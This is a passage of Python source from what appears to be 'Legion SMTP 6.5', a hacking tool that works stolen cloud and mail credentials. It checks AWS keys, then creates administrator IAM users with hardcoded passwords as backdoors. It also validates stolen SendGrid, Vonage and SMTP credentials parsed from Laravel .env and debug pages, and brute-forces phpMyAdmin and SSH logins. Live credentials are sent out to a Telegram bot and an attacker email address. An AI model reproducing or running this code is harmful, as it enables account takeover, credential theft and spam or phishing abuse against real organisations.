        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Result(Apache)/!AWS_key_live.txt', 'a')
        remover = str(balance).replace(',', '\n')
        save.write(str(ACCESS_KEY) + '|' + str(SECRET_KEY) + '|' + str(REGION) + '|' + str(balance)+'\n')
        save.close()
        print(f'{red}# {gr}[AWS QUOTA VALID] {cy}{ACCESS_KEY} {yl} ==> {red}{balance}')
    except:
        pass
def autocreate(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='Myl3gion552014')
        response2 = client2.create_login_profile(UserName='Myl3gion552014',
          Password='Myl3gion#20210285',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='Myl3gion552014')
        with lock:
            print(f'{gr}[#######]{cy}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Results/cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + ACCESS_KEY + '\nSECRET KEY : ' + SECRET_KEY + '\nREGION : ' + REGION + '\n\n==> Created User\n\n' + remover2 + '\n\n==> USER & PASS IAM USER\n\nUser : Myl3gion\nPass : Myl3gion#2021\n\n' + remover + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
            sendtestoff(url, ACCESS_KEY, SECRET_KEY, REGION, remover2, remover)
        except:
            pass

    except Exception as e:
        try:
            with lock:
                print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def autocreateses(url, ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='Myl3gion552014')
        response2 = client2.create_login_profile(UserName='Myl3gion552014',
          Password='Myl3gion#20210285',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='Myl3gion552014')
        print(f'{gr}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Results/!cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + str(ACCESS_KEY) + '\nSECRET KEY : ' + str(SECRET_KEY) + '\nREGION : ' + str(REGION) + '\n\n==> Created User\n\n' + str(remover2) + '\n\n==> USER & PASS IAM USER\n\nUser : Myl3gion\nPass : Myl3gion#2021\n\n' + str(remover) + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
        except:
            pass
    except Exception as e:
        try:
            print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def autocreate2(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='Myl3gion00895')
        response2 = client2.create_login_profile(UserName='Myl3gion00895',
          Password='WeAreLegion008#$',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='Myl3gion00895')
        with lock:
            print(f'{gr}[#######]{cy}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Result(Apache)/!cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + ACCESS_KEY + '\nSECRET KEY : ' + SECRET_KEY + '\nREGION : ' + REGION + '\n\n==> Created User\n\n' + remover2 + '\n\n==> USER & PASS IAM USER\n\nUser : Myl3gion\nPass : Myl3gion#2021\n\n' + remover + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
            sendtestoff(url, ACCESS_KEY, SECRET_KEY, REGION, remover2, remover)
        except:
            pass

    except Exception as e:
        try:
            with lock:
                print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def autocreateses2(url, ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='Myl3gion00895')
        response2 = client2.create_login_profile(UserName='Myl3gion00895',
          Password='WeAreLegion008#$',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='Myl3gion00895')
        print(f'{gr}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Result(Apache)/!cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + str(ACCESS_KEY) + '\nSECRET KEY : ' + str(SECRET_KEY) + '\nREGION : ' + str(REGION) + '\n\n==> Created User\n\n' + str(remover2) + '\n\n==> USER & PASS IAM USER\n\nUser : Myl3gion\nPass : Myl3gion#2021\n\n' + str(remover) + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
        except:
            pass
    except Exception as e:
        try:
            print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def ceker_sendgrid(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Results/!sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
            message = {'text': f"🔥  Legion SMTP 6.5 BOT [SENDGRID LIMIT]\n🏦 APIKEY = {f_key}\nLIMIT= {go_to['total']}\nREMAIN= {go_to['remain']}\nFROM_MAIL= {cekmail['email']}\nSENDGRID OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            smtp_login(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False):
    hostnya = str(hostnya)
    portnya = str(portnya)
    usernya = str(usernya)
    pwnya = str(pwnya)
    if tutor == 'env':
        if mail_fromer:
            mail_from = mail_fromer
        else:
            ####### GET MAIL FROM ######
            try:
                if "MAIL_FROM_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_FROM=" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                else:
                    mail_from = False
            except:
                mail_from = False
        ############################
        ###### GET MAIL NAME #######
        try:
            mail_name = re.findall('MAIL_FROM_NAME=(.*?)\n', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('APP_NAME=(.*?)\n', target)[0]
                if mail_name.startswith('"') and mail_name.endswith('"'):
                    mail_name = mail_name.replace('"', '')
                if mail_name.startswith("'") and mail_name.endswith("'"):
                    mail_name = mail_name.replace("'", '')
            else:
                if '\r' in mail_name:
                    mail_name = mail_name.replace('\r', '')
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
                else:
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
        except:
            mail_name = False
        ############################
    elif tutor == 'debug':
        try:
            mail_from = re.findall('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '@' in mail_from:
                pass
            else:
                mail_from = False
        except:
            mail_from = False
        try:
            mail_name = re.findall('<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('<td>APP_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            else:
                mail_name = False
        except:
            mail_name = False
    msg = MIMEMultipart()
    msg['subject'] = 'LEGION SMTP TEST!!'
    if mail_name:
        msg['from'] = mail_name
    else:
        msg['from'] = usernya
    if mail_from:
        sender = mail_from
    else:
        sender = usernya
    msg['to'] = email_receiver
    msg.add_header('Content-Type', 'text/html')
    if mail_name:
        msg.attach(MIMEText(
            'host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br>from name => {} <br><br>SMTP Tested By Legion Tools'.format(
                hostnya, portnya, usernya, pwnya, sender, mail_name), 'html', 'utf-8'))
    else:
        msg.attach(MIMEText(
            'host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br><br>SMTP Tested By Legion Tools'.format(
                hostnya, portnya, usernya, pwnya, sender), 'html', 'utf-8'))
    try:
        server = smtplib.SMTP(hostnya, int(portnya))
        server.login(usernya, pwnya)
        server.sendmail(sender, [msg['to']], msg.as_string())
        server.quit()
        if mail_name:
            open('Results/!smtp_live.txt', 'a').write(
                '{}|{}|{}|{}\n'.format(
                    hostnya, portnya, usernya, pwnya, sender, mail_name))
            message = {'text': f"☄️  LAVAFUT BOT [SMTP Live]\n📪 {hostnya}|{portnya}|{usernya}|{pwnya}\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        else:
            open('Results/!smtp_live.txt', 'a').write(
                '{}|{}|{}|{}\n'.format(
                    hostnya, portnya, usernya, pwnya, sender))

    except:
        try:
            server = smtplib.SMTP(hostnya, int(portnya))
            server.starttls()
            server.login(usernya, pwnya)
            server.sendmail(sender, [msg['to']], msg.as_string())
            server.quit()
            if mail_name:
                open('Results/!smtp_live.txt', 'a').write(
                    '{}|{}|{}|{}\n'.format(
                        hostnya, portnya, usernya, pwnya, sender, mail_name))
                message = {'text': f"☄️  LAVAFUT BOT [SMTP Live]\n📪 {hostnya}|{portnya}|{usernya}|{pwnya}\nSending OK =>🟢\n"}
                requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            else:
                open('Results/!smtp_live.txt', 'a').write(
                    '{}|{}|{}|{}\n'.format(
                        hostnya, portnya, usernya, pwnya, sender))
        except:
            pass
def mail2(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    login = str(mailuser.replace('"', ''))  # paste your login generated by Mailtrap
    password = str(mailpass.replace('"', '')) # paste your password generated by Mailtrap
    receiver_email = emailnow
    message = MIMEMultipart('alternative')
    message['Subject'] = f'📪King Forza SMTP | {mailhost} '
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f" <h3>King Forza smtps! - SMTP Data for you!</h3><br>{mailhost} <br><br><h5>Mailer King with from</h5><br>==================<br><i>{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:</i><br>==================<br><br><h5>Mailer king Normal</h5><br>==================<br>{mailhost}:{mailport}:{mailuser}:{mailpass}::ssl::::0:<br>==================<br><br>        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        message = {'text': f"☄️  Legion SMTP 6.5 BOT [SMTP Live]\n📪 {mailhost}|{mailport}|{mailuser}|{mailpass}\nFrom:{mailfrom}\nSending OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Results/!Valid_Smtps.txt', 'a')
        save.write(f'{mailhost}|{mailport}|{mailuser}|{mailpass}|{mailfrom}\n')
        save.close()
    except:
        pass
def sendmailgun(url, mailhost,mailport,mailuser,mailpass,mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    login = str(mailuser.replace('"', ''))  # paste your login generated by Mailtrap
    password = str(mailpass.replace('"', ''))
    receiver_email = emailnow
    message = MIMEMultipart('alternative')
    message['Subject'] = f'📪 MailGun SMTP | {mailhost} '
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f" <html><body><center><h3>Legion SMTP 6.5</h3><p style='color:#FF0000'><b>Send by MyLegion</p><p>-------------------</p></center><table id='customers' class='table table-bordered table-hover'><thead><tr><th style='width: 25%'>URL</th><th style='width: 10%'>Host</th><th style='width: 10%'>Port</th><th style='width: 10%'>User</th><th style='width: 10%'>Pass</th><th style='width: 10%'>From</th></tr><tr><th style='width: 25%'></th><th style='width: 10%'>{mailhost}</th><th style='width: 10%'>{mailport}</th><th style='width: 10%'>{mailuser}</th><th style='width: 10%'>{mailpass}</th><th style='width: 10%'>{mailfrom}</th></tr></thead><tbody></tbody></table><br><p style='color:#00ff00'>SMTP Mailer King:</p><b>{mailhost}:{mailport}:{mailuser}:{mailpass}::ssl::::0:</p><p style='color:#FF0000'>SMTP SMTP Tester:</p><b>{mailhost}|{mailport}|{mailuser}|{mailpass}</p></body></html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        save = open('!Valid_Mailgun.txt', 'a')
        save.write(f'{mailhost}|{mailport}|{mailuser}|{mailpass}|{mailfrom}\n')
        save.close()
        print(f"{gr} Email sent")
    except:
        pass
def phpmyadmin(target, user, pw):
    try:
        if 'http://' in target:
            pol = 'http://' + parser_url(target)
        elif 'https://' in target:
            pol = 'https://' + parser_url(target)
        req = requests.Session()
        uwu = req.get(pol + '/phpmyadmin', headers=head, timeout=int(default_timeout))
        if '<title>phpMyAdmin</title>' in uwu.text or 'pma_username' in uwu.text:
            # print(target,user,pw)
            try:
                token = re.findall('<input type="hidden" name="token" value="(.*?)"', uwu.text)[0]
            except:
                token = ''
            data = {
                'pma_username': user,
                'pma_password': pw,
                'server': '1',
                'target': 'index.php',
                'token': token
            }
            # print(data)
            coba = req.post(pol + '/phpmyadmin/index.php', data=data, timeout=int(default_timeout))
            if 'Log out' in coba.text or token in coba.url:
                open('Result(method2)/phpmyadmin.txt', 'a').write(pol + '/phpmyadmin' + '|{}|{}'.format(user, pw) + '\n')
                return True
            else:
                return False
        else:
            req = requests.Session()
            uwu = req.get(pol + '/phpMyAdmin', headers=head, timeout=int(default_timeout))
            if 'pma_username' in uwu.text:
                token = re.findall('<input type="hidden" name="token" value="(.*?)"', uwu.text)[0]
                data = {
                    'pma_username': user,
                    'pma_password': pw,
                    'server': '1',
                    'target': 'index.php',
                    'token': token
                }
                coba = req.post(pol + '/phpMyAdmin/index.php', data=data, timeout=int(default_timeout))
                if 'Log out' in coba.text or token in coba.url:
                    open('Result(method2)/phpmyadmin.txt', 'a').write(pol + '/phpMyAdmin' + '|{}|{}'.format(user, pw) + '\n')
                    return True
                else:
                    return False
            else:
                return False

    except:
        return False
def adminer(target, user, pw):
    try:
        if 'http://' in target:
            pol = 'http://' + parser_url(target)
        elif 'https://' in target:
            pol = 'https://' + parser_url(target)
        su = ['/Adminer.php', '/adminer.php']
        for pape in su:
            cc = requests.Session()
            go = cc.get(pol + pape, headers=head, timeout=12)
            if 'Login - Adminer' in go.text or 'class="jush-sql jsonly hidden"' in go.content:
                pass
    except:
        return False
def login_nexmo2(f_url, f_key, f_secret):
    try:
        f_key = str(f_key)
        f_secret = str(f_secret)
        cl = vonage.Client(key=f_key, secret=f_secret)
        res = cl.get_balance()
        open('Result(method2)/nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
    except:
        pass
def ceker_sendgrid2(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Result(method2)/sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
            message = {'text': f"🔥  Legion SMTP 6.5 BOT [SENDGRID LIMIT]\n🏦 APIKEY = {f_key}\nLIMIT= {go_to['total']}\nREMAIN= {go_to['remain']}\nFROM_MAIL= {cekmail['email']}\nSENDGRID OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            smtp_login(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def ceker_sendgrid3(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Result(Apache)/!sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
            message = {'text': f"🔥  Legion SMTP 6.5 BOT [SENDGRID LIMIT]\n🏦 APIKEY = {f_key}\nLIMIT= {go_to['total']}\nREMAIN= {go_to['remain']}\nFROM_MAIL= {cekmail['email']}\nSENDGRID OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            smtp_login(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def smtp_login2(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False):
    hostnya = str(hostnya)
    portnya = str(portnya)
    usernya = str(usernya)
    pwnya = str(pwnya)
    if tutor == 'env':
        if mail_fromer:
            mail_from = mail_fromer
        else:
            ####### GET MAIL FROM ######
            try:
                if "MAIL_FROM_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_FROM=" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                else:
                    mail_from = False
            except:
                mail_from = False
        ############################
        ###### GET MAIL NAME #######
        try:
            mail_name = re.findall('MAIL_FROM_NAME=(.*?)\n', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('APP_NAME=(.*?)\n', target)[0]
                if mail_name.startswith('"') and mail_name.endswith('"'):
                    mail_name = mail_name.replace('"', '')
                if mail_name.startswith("'") and mail_name.endswith("'"):
                    mail_name = mail_name.replace("'", '')
            else:
                if '\r' in mail_name:
                    mail_name = mail_name.replace('\r', '')
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
                else:
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
        except:
            mail_name = False
        ############################
    elif tutor == 'debug':
        try:
            mail_from = re.findall('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '@' in mail_from:
                pass
            else:
                mail_from = False
        except:
            mail_from = False
        try:
            mail_name = re.findall('<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('<td>APP_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            else:
                mail_name = False
        except:
            mail_name = False
    msg = MIMEMultipart()
    msg['subject'] = 'SMTP TEST!!'
    if mail_name:
        msg['from'] = mail_name
    else:
        msg['from'] = usernya
    if mail_from:
        sender = mail_from
    else:
        sender = usernya
    msg['to'] = email_receiver
    msg.add_header('Content-Type', 'text/html')
    if mail_name:
        msg.attach(MIMEText(
            'host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br>from name => {} <br><br>SMTP Tested By Legion Tools'.format(
                hostnya, portnya, usernya, pwnya, sender, mail_name), 'html', 'utf-8'))
    else:
        msg.attach(MIMEText(
            'host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br><br>SMTP Tested By Legion Tools'.format(
                hostnya, portnya, usernya, pwnya, sender), 'html', 'utf-8'))
    try:
        server = smtplib.SMTP(hostnya, int(portnya))
        server.login(usernya, pwnya)
        server.sendmail(sender, [msg['to']], msg.as_string())
        server.quit()
        if mail_name:
            open('Result(method2)/SMTP/smtp_live.txt', 'a').write(
                '-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\nMAIL_FROM_NAME={}\n'.format(
                    hostnya, portnya, usernya, pwnya, sender, mail_name))
        else:
            open('Result(method2)/SMTP/smtp_live.txt', 'a').write(
                '-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\n'.format(
                    hostnya, portnya, usernya, pwnya, sender))
    except:
        try:
            server = smtplib.SMTP(hostnya, int(portnya))
            server.starttls()
            server.login(usernya, pwnya)
            server.sendmail(sender, [msg['to']], msg.as_string())
            server.quit()
            if mail_name:
                open('Result(method2)/SMTP/smtp_live.txt', 'a').write(
                    '-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\nMAIL_FROM_NAME={}\n'.format(
                        hostnya, portnya, usernya, pwnya, sender, mail_name))
            else:
                open('Result(method2)/SMTP/smtp_live.txt', 'a').write(
                    '-' * 33 + '\nMAIL_HOST={}\nMAIL_PORT={}\nMAIL_USERNAME={}\nMAIL_PASSWORD={}\nMAIL_FROM_ADDRESS={}\n'.format(
                        hostnya, portnya, usernya, pwnya, sender))
        except:
            pass
def loginssh(ssh_host, ssh_user, ssh_pw):
    try:
        ssh_host = str(ssh_host)
        ssh_user = str(ssh_user)
        ssh_pw = str(ssh_pw)
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        s.connect(ssh_host, '22', ssh_user, ssh_pw)
        stdin, stdout, stderr = s.exec_command('uname -a')
        output = stdout.read()
        with open('Result(method2)/ssh.txt', 'a') as oo:
            oo.write('{}|{}|{}'.format(ssh_host, ssh_user, ssh_pw) + '\n')
        return True
    except:
        return False
def ceker_aws2(f_url, f_key, f_secret, f_region):
    try:
        f_region = str(f_region)
        f_key = str(f_key)
        f_secret = str(f_secret)
        klien = boto3.client(
            'ses',
            aws_access_key_id=f_key,
            aws_secret_access_key=f_secret,
            region_name=f_region
        )
        balance = klien.get_send_quota()['Max24HourSend']
        open('Result(method2)/aws_key_live.txt', 'a').write(
            '{}|{}|{}|{}|{}'.format(f_url, f_key, f_secret, f_region, balance) + '\n')
    except:
        pass
def mail(url, mailhost, mailport, mailuser, mailpass, mailfrom):

    if 'sendgrid' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = "King SENDGRID smtps! - SMTP Data for you!\n{2} \n\nMailer King with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer king Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "SendGrid Forza SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Legion SMTP 6.5 BOT [SendGrid Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
